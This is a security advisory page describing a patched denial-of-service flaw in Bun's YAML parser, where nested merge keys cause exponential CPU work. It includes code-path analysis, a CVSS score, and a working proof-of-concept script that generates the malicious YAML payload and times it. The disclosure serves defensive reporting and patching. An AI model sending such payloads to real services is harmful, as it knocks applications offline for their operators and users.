---
schema_version: "1.0.0"
document_id: "de5990798745fe7603c8857f3782fe295ee315f2ab25b4817c8f5fad924a79d7"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/bun-yaml-dos"
published_at: "2025-01-01T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T20:58:25.712310+00:00"
content_hash: "sha256:cd4b9b7fee3ac85bf87fc6a3d2e3d6bc17d5b61aecad5eb67473c1a59ab5df74"
---

# Exponential merge keys in Bun&apos;s YAML implementation leads to DoS

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


Bun


High


2025


# Exponential merge keys in Bun's YAML implementation leads to DoS


## Summary


Exponential merge keys in` Bun.YAML.parse` trigger CPU exhaustion


` Bun.YAML.parse` materialises YAML mappings by iterating every merge (` <<` ) entry and blindly appending the referenced property list to the target object (` src/bun.js/api/YAMLObject.zig:1034-1045` ). Because the loop does not track merge depth or repeated anchors, an attacker can craft a document where each level merges all previous anchors (` <<: \[*a0, *a1, …\]` ). The parser repeatedly copies the entire accumulated property array for each level, resulting in exponential work while the payload remains only a few kilobytes. Running the supplied payload against Bun 1.3.0 (` bun --eval …` ) shows parse times climbing past 9 seconds on a single CPU core, enabling a trivial network DoS via untrusted YAML input.


### CVSS Score


Vector


N


Complexity


L


Privileges


N


User Interaction


N


Scope


U


Confidentiality


N


Integrity


N


Availability


H


CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H


### Vulnerability Location


Source


Line 915-960


src /bun.js


/api


/YAMLObject.zig


Bun.YAML.parse


Sink


Line 1034-1045


src /bun.js


/api


/YAMLObject.zig


ParserCtx.toJS (object materialisation loop)


## Source-to-Sink Analysis


1


src/bun.js/api/YAMLObject.zig:922


` Bun.YAML.parse` accepts attacker-controlled input and invokes the YAML parser without imposing size or recursion limits.


ZIG


```text
const   input_value = callFrame. argumentsAsArray  ( 1  )[ 0  ];


```


2


src/interchange/yaml.zig:780-893


` parseFlowMapping` /` parseBlockMapping` build AST nodes whose` properties` slices simply inline every merge (` <<` ) target, duplicating anchors instead of referencing them.


ZIG


```text
try   props. appendSlice  (value_obj.properties. slice  ());


```


3


src/bun.js/api/YAMLObject.zig:1034-1041


` ParserCtx.toJS` iterates the` properties` slice and converts each entry into JS strings/values with no merge-depth accounting.


ZIG


```text
const   key_str =  try   key. toBunString  (ctx.global);


try   obj. putMayBeIndex  (ctx.global, &key_str, value);


```


4


src/bun.js/bindings/bindings.cpp:3735


` putMayBeIndex` stores each property on the JS object, so the exponential number of duplicated keys translates directly into CPU time before` YAML.parse` returns to user code.


CPP


```text
object-> putDirectMayBeIndex  (...);


```


## Impact Analysis


### Critical Impact


Repeated requests allow an unauthenticated attacker to peg a CPU core and starve other work, causing a denial of service. Memory usage also spikes due to repeated property duplication.


### Attack Surface


Any Bun application that calls` Bun.YAML.parse` (or` YAML.parse` ) on user-controlled data—configuration endpoints, API payloads, etc.—is affected.


### Preconditions


None; the attacker only needs the ability to submit a YAML document. No authentication or special privileges are required.


## Proof of Concept


### Environment Setup


Requirements: macOS 15.1 (Apple M1), Bun 1.3.0 (system install).


Verify version:


BASH


```text
bun --version
# 1.3.0


```


### Target Configuration


Execute the following script, which builds a depth-24 merge payload (~2.2 KB) and measures parse time:


BASH


```text
/usr/bin/env bun -- eval    '
import { YAML } from "bun";
function build(depth) {
const lines = [];
lines.push(`a0: &a0\n  k0: 0`);
for (let i = 1; i <= depth; i++) {
const refs = Array.from({ length: i }, (_, j) => `*a${j}`).join(", ");
lines.push(`a${i}: &a${i}\n  <<: [${refs}]\n  k${i}: ${i}`);
}
lines.push(`root:\n  <<: *a${depth}`);
return lines.join("\n");
}
const payload = build(24);
const start = Date.now();
YAML.parse(payload);
console.log({ depth: 24, durationMs: Date.now() - start, payloadBytes: payload.length });
'


```


### Exploit Delivery


### Outcome


` Bun.YAML.parse` spends ~9.5 seconds materialising a 2.2 KB document, allowing a remote attacker to keep a core saturated by repeatedly sending the payload. Higher depths continue to grow exponentially, so parallel requests can knock the process offline entirely.


**Expected Response:**


TEXT


```text
{
depth: 24,
durationMs: 9498,
payloadBytes: 2249
}


```


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/oven-sh/bun/pull/24729)
